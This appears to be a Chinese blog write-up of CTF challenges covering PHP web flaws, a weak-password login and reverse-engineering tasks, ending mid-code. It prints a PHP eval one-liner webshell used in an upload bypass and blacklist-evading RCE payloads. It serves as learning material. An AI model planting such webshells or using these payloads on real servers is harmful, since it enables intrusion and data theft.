<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;=Level 4=&quot;</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">  <span class="variable">$flag4</span> = True;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造Payload如下：</p>
<blockquote>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;2&amp;key5&#x3D;2024a</p>
<p>POST-DATA: key3[]&#x3D;1</p>
</blockquote>
<p>第五关考察extract函数导致的变量覆盖漏洞，这里的if判断只要保证传入变量flag5即可，根据上面的正则限制，变量值不能为字母和数字，那么传入一个任意符号即可通过本层。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;=Level 5=&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造Payload如下：</p>
<blockquote>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;2&amp;key5&#x3D;2024a</p>
<p>POST-DATA: key3[]&#x3D;1&amp;flag5&#x3D;?</p>
</blockquote>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.58yehkkyq3o0.webp" alt="image"></p>
<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><ul>
<li><p><strong>考点</strong>：PHP文件上传漏洞</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p>本题主要考察PHP文件上传漏洞的前端校验绕过</p>
<p>编写含有一句话木马的文件命名为1.php内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;it is ok&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击上传文件，会弹出</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6725ejsqclg0.webp" alt="image"></p>
<p>想到题目是使用JavaScript对文件拓展名进行限制</p>
<p>打开浏览器设置禁用js</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6yqlt5zjs6k0.webp" alt="image"></p>
<p>再次上传，得到上传文件的路径</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.615ykeguv800.webp" alt="image"></p>
<p>访问路径 url&#x2F;upload&#x2F;1.php</p>
<p>然后命令执行得到flag</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7efhs05aa840.webp" alt="image"></p>
<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><ul>
<li><p><strong>考点</strong>：md5碰撞、PHP特殊符号传参、PHP命令执行、黑名单绕过</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p>首先题目要求 POST 传入一个 password ，password 的 hash 前六位为 c4d038，而哈希加密是一种不可破解的算法，我们只能通过碰撞来尝试获取我们需要的 password。</p>
<p>substr($password,0,6)&#x3D;&#x3D;&#x3D;”c4d038”</p>
<p>可以写一个简单的 python 脚本来进行碰撞，先尝试简单的数字组合，看是否有符合条件的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">pre</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999999</span>):</span><br><span class="line">     <span class="keyword">if</span> (hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&quot;UTF-8&quot;</span>)).hexdigest())[<span class="number">0</span>:<span class="number">6</span>] == <span class="built_in">str</span>(pre):</span><br><span class="line">      <span class="built_in">print</span>(i)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">crack(<span class="string">&quot;c4d038&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行结果是114514，得到了密码。</p>
<p>再看下一个传参，可以发现这个变量名有下划线也有点。</p>
<blockquote>
<p>$code&#x3D;$_POST[‘e_v.a.l’];</p>
</blockquote>
<p>这时候如果直接按这个变量名来传参，php 是无法接收到这个值的，具体原因是 php 会自动把一些不合法的字符转化为下划线（注：php8以下），比如这个点就会被转换为下划线，另外这种转换只会发生一次。故直接传相当于传的变量名为 e_v_a.l 。具体转换可以参考下图：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2019h3nte800.webp" alt="image"></p>
<p>于是为了防止我们的点被自动转换，我们可以先让第一个下划线位置为不合法字符，从而转换为下划线，不会再转换后面的点。比如可以传入 e[v.a.l 。</p>
<p>最后看命令执行部分，这里是有一个黑名单的过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是禁止了 system 函数，可以采用 php 自带的函数来达到一样的效果，先使用 scandir 看一下目录，注意 scandir 是不会回显输出的，记得加上 var_dump。</p>
<blockquote>
<p>e[v.a.l&#x3D;var_dump(scandir(‘&#x2F;‘));</p>
</blockquote>
<p>看到了 flag 在根目录下。但是黑名单过滤了 flag 关键字，我们没法直接读取，于是可以使用参数逃逸绕过限制：</p>
<blockquote>
<p>POST:password&#x3D;114514&amp;e[v.a.l&#x3D;var_dump(file_get_contents($_POST[‘a’]));&amp;a&#x3D;&#x2F;flag</p>
</blockquote>
<p>得到flag。</p>
<h3 id="EasyLogin-1"><a href="#EasyLogin-1" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><ul>
<li><p><strong>考点</strong>：弱口令登录、HTTP 302 跳转抓包</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p>进入之后是一个登录界面，先随便注册一个账号登进去看看。</p>
<p><code>Ctrl``C</code>和<code>Ctrl``D</code>回到 Shell，简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询Bash历史记录。</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.15js7ajhu4f4.webp" alt="image"></p>
<p>发现 Hint，得知 admin 的密码为弱密码加上<code>newstarnewstar2023</code>后其中的一个。</p>
<p>按<code>CtrlD</code>或者输入<code>exit</code>后回车回到登录界面。</p>
<p>试一下<code>newstar``newstar2023</code>，没登进去，在网上随便搜弱密码，试一些常见的，试出来是<code>qwe123</code>，不同的靶机密码可能不一样。</p>
<p><strong>提示：</strong>题目采用的弱密码表</p>
<blockquote>
<p>123456789</p>
<p>password</p>
<p>newstar</p>
<p>newstar2023</p>
<p>123qwe</p>
<p>qwe123</p>
<p>qwertyuiop</p>
<p>asdfghjkl</p>
<p>zxcvbnm</p>
<p>admin123</p>
<p>admin888</p>
<p>111111</p>
<p>000000</p>
</blockquote>
<p>查询历史记录只提示了使用<code>BurpSuite</code>，尝试抓包。</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1o5xgiwkpqtc.webp" alt="image"></p>
<p>使用<code>BurpSuite</code>拦截、开启代理，重新完成一次登录，发现一个<code>/passport</code>的 302 跳转，查看它的响应获取 flag.</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2tryl616bns0.webp" alt="image"></p>
<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="re-1"><a href="#re-1" class="headerlink" title="re"></a>re</h2><h3 id="PZthon"><a href="#PZthon" class="headerlink" title="PZthon"></a>PZthon</h3><p>先使用python pyinstxtractor-ng.py PZthon.exe，将exe转换成pyc文件</p>
<p>然后使用uncompyle6发现需要python3.9的版本，好好好，电脑里一个3.10一个3.8就是没有3.9，所以直接去网站解码就行</p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i]=enc[i]^<span class="number">21</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="SMC（-）"><a href="#SMC（-）" class="headerlink" title="SMC（*）"></a>SMC（*）</h3><p>记录一次SMC的实操</p>
<p>首先我们分析源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD *v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x26</span>u);</span><br><span class="line">  VirtualProtect(sub_403040, <span class="number">0x26</span>u, <span class="number">0x40</span>u, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your flag:&quot;</span>);</span><br><span class="line">  sub_401025(<span class="string">&quot;%s&quot;</span>, &amp;byte_4033D4);</span><br><span class="line">  <span class="keyword">if</span> ( NtCurrentPeb()-&gt;gap2 )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Debug Detected!&quot;</span>, <span class="string">&quot;Warning!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    Sleep(<span class="number">0x1388</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401042();</span><br><span class="line">  <span class="keyword">if</span> ( (*sub_403040)(&amp;byte_4033D4, &amp;byte_403020) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Win!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Lose!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SMC是对程序进行自加密的题型，一般会有自解函数，只要你执行到SMC自解函数就可以看到本来的函数地址那块的数值变了，那个时候就可以进行编译成函数了</p>
<p>我们可以看到自解密函数就在主函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">sub_401042</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">38</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = byte_403068[i &amp; <span class="number">3</span>];</span><br><span class="line">    sub_403040[i] ^= result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们在result下断点，只要在程序运行到这里就可以对程序进行自解密，到目前为止这是比较一般的SMC题目的解出过程，但在我们调试的时候发现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( NtCurrentPeb()-&gt;gap2 )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Debug Detected!&quot;</span>, <span class="string">&quot;Warning!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    Sleep(<span class="number">0x1388</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这一块函数只要检测到我们进行dbg调试就会退出程序，所以我们想到另外一种方式进行调试</p>
<blockquote>
<p>Debugger-&gt;attach to process-&gt;SMC_2.exe</p>
</blockquote>
<p>当然我们肯定知道他自解密的函数就是  if ( (*sub_403040)(&amp;byte_4033D4, &amp;byte_403020) )（需要你去看一下他的自解密函数的语句），我们此时对比一下解密与不解密之前的数值</p>
<p>没解密之前的地址数值</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5d4k5tf47eg0.webp"></p>
<p>自解密后的数值</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.26iivmz0gklc.webp"></p>
<p>我们可以看到明显的不同，我们没有发现花指令等，那么我直接在函数头的位置按c将其转换成代码，在按p编译成函数就可以F5啦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">sub_403040</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (byte_4033D4[v0] ^ <span class="number">0x11</span>) + <span class="number">5</span> == byte_403020[v0] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 &gt;= <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反编译出来的代码可以看出就是很贱的加减异或，直接编写代码返还即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chars=[</span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x82</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, <span class="number">0x6F</span>, <span class="number">0x47</span>, <span class="number">0x61</span>, <span class="number">0x57</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, </span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, <span class="number">0x84</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x68</span>, <span class="number">0x27</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>, <span class="number">0x35</span>, <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0x7E</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x71</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chars)):</span><br><span class="line">    chars[i]=(chars[i]-<span class="number">5</span>)^<span class="number">0x11</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(chars[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Petals（花指令）"><a href="#Petals（花指令）" class="headerlink" title="Petals（花指令）"></a>Petals（花指令）</h3><p>学习花指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here is a pack of flowers, to my best love --- you.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But I must check your identity, please input the right passwd&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, byte_4080);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(byte_4080);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(byte_4080) != <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please check your input&#x27;s format!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  (loc_1209)(byte_4080, v4);</span><br><span class="line">  sub_160C(byte_4080, &amp;unk_4020, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;If you are succeed, the flag is flag&#123;md5(your input)&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析主函数，我们已知前面是接受我们的输入，然后输入的长度是25，&amp;unk_4020中就是我们的数据，我们提取出来后备用，我们猜测(loc_1209)(byte_4080, v4);，就是我们要去花的函数，双击进入(loc_1209)函数，可以看到一片大红，在下面我们找到了他的花指令所在地点，永真跳转，加E8，（E8就相当于跳过了8个字节的数据，所以E8后面才是我们真正要执行的代码数据）</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.69alfdji2do0.webp"></p>
<p>（1）我们在E8的位置单击，摁D，将其转换成数据，然后我们对着E8右击，选择nop，将其nop掉</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7h3oybqr9u80.webp"></p>
<p>（2）我们回到最开始的位置endbr64上面函数开头的位置，从上往下直到选中retn处停止，我们摁c将其转换成代码，再摁p转换成函数，这个花就成功去除了，我们可以看到，左侧IDA也不会爆红了</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231009132250253.png"></p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.212ogn4b84m8.webp"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1209</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-118h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v5[<span class="number">33</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    *(v5 + i) = ~(i ^ a2);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; a2 &gt; j; ++j )</span><br><span class="line">    *(j + a1) = *(v5 + *(j + a1));</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反编译出来的代码通过分析就建立一个盒子，然后根据之前取到的数据，进行定位取值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">chars =[</span><br><span class="line">  <span class="number">0xD0</span>, <span class="number">0xD0</span>, <span class="number">0x85</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xC5</span>, <span class="number">0x8A</span>, <span class="number">0x93</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0x92</span>, <span class="number">0x8F</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x9F</span>, <span class="number">0x8F</span>, <span class="number">0xC5</span>, <span class="number">0x84</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, </span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0x82</span>, <span class="number">0xD3</span>, <span class="number">0xDE</span>, <span class="number">0x87</span>]</span><br><span 